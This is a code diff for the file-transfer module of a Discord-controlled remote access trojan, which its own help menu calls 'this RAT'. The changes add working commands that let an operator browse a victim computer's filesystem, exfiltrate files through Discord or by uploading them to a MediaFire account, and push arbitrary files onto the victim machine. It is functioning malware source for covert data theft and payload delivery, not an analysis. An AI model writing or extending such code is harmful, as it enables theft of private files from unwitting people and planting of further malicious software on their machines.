@@ -1,30 +1,32 @@
 from shell.helpMenu import Menu, Command
-from mediafire import MediaFireApi as mfApi
-import discord, os, random
+from shell.tools import *
+from mediafire.client import (MediaFireClient as mfClient, File as mfFile)
+import discord, os
 
 class FTPShell:
     def __init__(self, mainShell, mediafire=False) -> None:
         self.active = False
         self.hMenu = Menu({
             "help": Command("This **help menu**"),
+            "author": Command("Some **info about the creator** of this RAT", (93, 0, 221)),
             "ping": Command("See if the RAT is running in this channel\n + Some small **latency info**", (34, 218, 25)),
-            "pwd": Command("Get current working **directory**", (224, 27, 27)),
-            "ls": Command("**list** **files** in directory (max 20)", (224, 27, 27), ["dir"]),
-            "lsall": Command("**list all files** in directory", (224, 27, 27), ["dirall"]),
-            "cd": Command("Navigate the **filesystem**", (224, 27, 27), usage="`cd <DIRECTORY`\n or `cd ..` to exit an directory"),
-            "get": Command("**Download** a file from the client (max 8MB)", (224, 27, 27), ["download", "pull"], "`get <FILE_TO_DOWNLOAD>`"),
-            "getbig": Command("**Download** a large file from the client (through mediafire)", (224, 27, 27), ["downloadbig", "pullbig"], "`getbig <FILE_TO_DOWNLOAD>`"),
-            "put": Command("**Upload** a file to the client", (224, 27, 27), ["upload", "give"], "`put <FILE_TO_UPLOAD>`"),
-            "cat": Command("**Preview** the contents of a file (first 300 chars)", (224, 27, 27), usage="`cat <FILE>`"),
-            "exit": Command("**Exit** the **FTP+** shell", (224, 27, 27)),
+            "pwd": Command("Get current working **directory**", (214, 210, 32)),
+            "ls": Command("**list** **files** in directory (max 20)", (34, 214, 77), ["dir"]),
+            "lsall": Command("**list all files** in directory", (34, 214, 77), ["dirall"]),
+            "cd": Command("Navigate the **filesystem**", (101, 34, 214), usage="`cd <DIRECTORY`\n or `cd ..` to exit an directory"),
+            "get": Command("**Download** a file from the client (max 8MB)", (50, 218, 27), ["download", "pull"], "`get <FILE_TO_DOWNLOAD>`"),
+            "getbig": Command("**Download** a large file from the client (through mediafire)", (50, 218, 27), ["downloadbig", "pullbig"], "`getbig <FILE_TO_DOWNLOAD>`"),
+            "put": Command("**Upload** a file to the client (max 8MB)", (227, 62, 26), ["upload", "give"], "`put <FILE_TO_UPLOAD>`"),
+            "putbig": Command("**Upload** a large to the client (through mediafire)\nYou need to login to the configured medifire user, upload a file and set the URL as a local url for the file, ex. `mf:/UploadedFile.txt`", (227, 62, 26), ["uploadbig", "givebig"], "`putbig <URL_TO_FILE>`"),
+            "cat": Command("**Preview** the contents of a file (first 300 chars)", (26, 60, 227), usage="`cat <FILE>`"),
             "exit": Command("**Exit** the **FTP+** shell", (224, 27, 27), ["quit", "bye"])
         })
         self.cwd = os.path.dirname(os.path.realpath(__file__))
         self.shell = mainShell
         self.mediafire = {"enabled":mediafire}
         if mediafire:
-            self.mediafire["api"] = mfApi()
-            self.mediafire["api"].user_get_session_token(email=self.shell.mediafire["email"], password=self.shell.mediafire["password"], app_id=str(random.randint(10000, 99999)))
+            self.mediafire["client"] = mfClient()
+            self.mediafire["client"].login(email=self.shell.mediafire["email"], password=self.shell.mediafire["password"], app_id="42511")
 
     def format_path(self, pathToFormat: str) -> str:
         newDir = self.cwd
@@ -125,18 +127,49 @@ class FTPShell:
                     await message.reply("**Error:** The provided file does **not exist** or you don't have **permission**.\n> The provided file: `"+filePath+"`")
             else:
                 await message.reply("**Usage:** `"+cmd[0]+" <FILE_TO_DOWNLOAD>`")
-        elif cmd[0] in ["getbig", "downloadbig", "pullbig"]: # TODO add support for mediafire
+        elif cmd[0] in ["getbig", "downloadbig", "pullbig"]:
             if self.mediafire["enabled"]:
-                pass
+                if len(cmd) > 1:
+                    filePath = self.format_path(" ".join(cmd[1:]))
+                    if os.path.isfile(filePath):
+                        try:
+                            self.mediafire["client"].upload_file(filePath, "mf:/")
+                            for item in self.mediafire["client"].get_folder_contents_iter("mf:/"):
+                                if item["filename"] == filePath.split("\\")[-1].split("/")[-1]:
+                                    break
+                            await message.reply("The provided file was **successfully uploaded** to mediafire and it is **ready for download**.\n> The provided file: `"+filePath+"`\n> Download URL: `"+item["links"]["normal_download"]+"`")
+                        except:
+                            await message.reply("**Error:** There was an **error* while uploading the file to mediafire.\n> The provided file: `"+filePath+"`")
+                    else:
+                        await message.reply("**Error:** The provided file does **not exist** or you don't have **permission**.\n> The provided file: `"+filePath+"`")
+                else:
+                    await message.reply("**Usage:** `"+cmd[0]+" <FILE_TO_DOWNLOAD>`")
             else:
                 await message.reply("**Error:** In order to download large files, you need to have the **mediafire account** configured")
-        elif cmd[0] in ["put", "upload", "give"]: # TODO
-            if len(cmd) > 1:
-                pass
+        elif cmd[0] in ["put", "upload", "give"]:
+            if len(message.attachments) > 0:
+                file = download_file(message.attachments[0].url)
+                f = open(message.attachments[0].filename, 'wb')
+                f.write(file)
+                f.close()
+                await message.reply("**Successfully** uploaded `"+message.attachments[0].filename+"` to the client")
             else:
-                await message.reply("**Usage:** `"+cmd[0]+" <FILE_TO_UPLOAD>`")
+                await message.reply("**Usage:** `"+cmd[0]+"` + attached file in message")
+        elif cmd[0] in ["putbig", "uploadbig", "givebig"]:
+            if self.mediafire["enabled"]:
+                if len(cmd) > 1:
+                    if "mf:/" == cmd[1][:4]:
+                        filename = (" ".join(cmd[1:])).split("/")[-1]
+                        self.mediafire["client"].download_file(" ".join(cmd[1:]), os.path.join(self.cwd, filename))
+                        await message.reply("**Successfully** uploaded `"+filename+"` to the client\n> Provided file `"+" ".join(cmd[1:])+"`")
+                    else:
+                        await message.reply("**Error:** **Invalid URL** supplied, an local MediaFire url is required\n> Expected: `"+cmd[0]+" mf:/.....` (for more info `help "+cmd[0]+"`)")
+                else:
+                    await message.reply("**Usage:** `"+cmd[0]+" <MEDIAFIRE_URL>`")
+            else:
+                await message.reply("**Error:** In order to upload large files, you need to have the **mediafire account** configured")
         elif cmd[0] in ["exit", "quit", "bye"]:
-            await message.reply("**Exiting** the FTP+ shel...")
+            await message.reply("**Exiting** the FTP+ shell...")
             self.active = False
         else:
             await message.reply("**Invalid Command**")
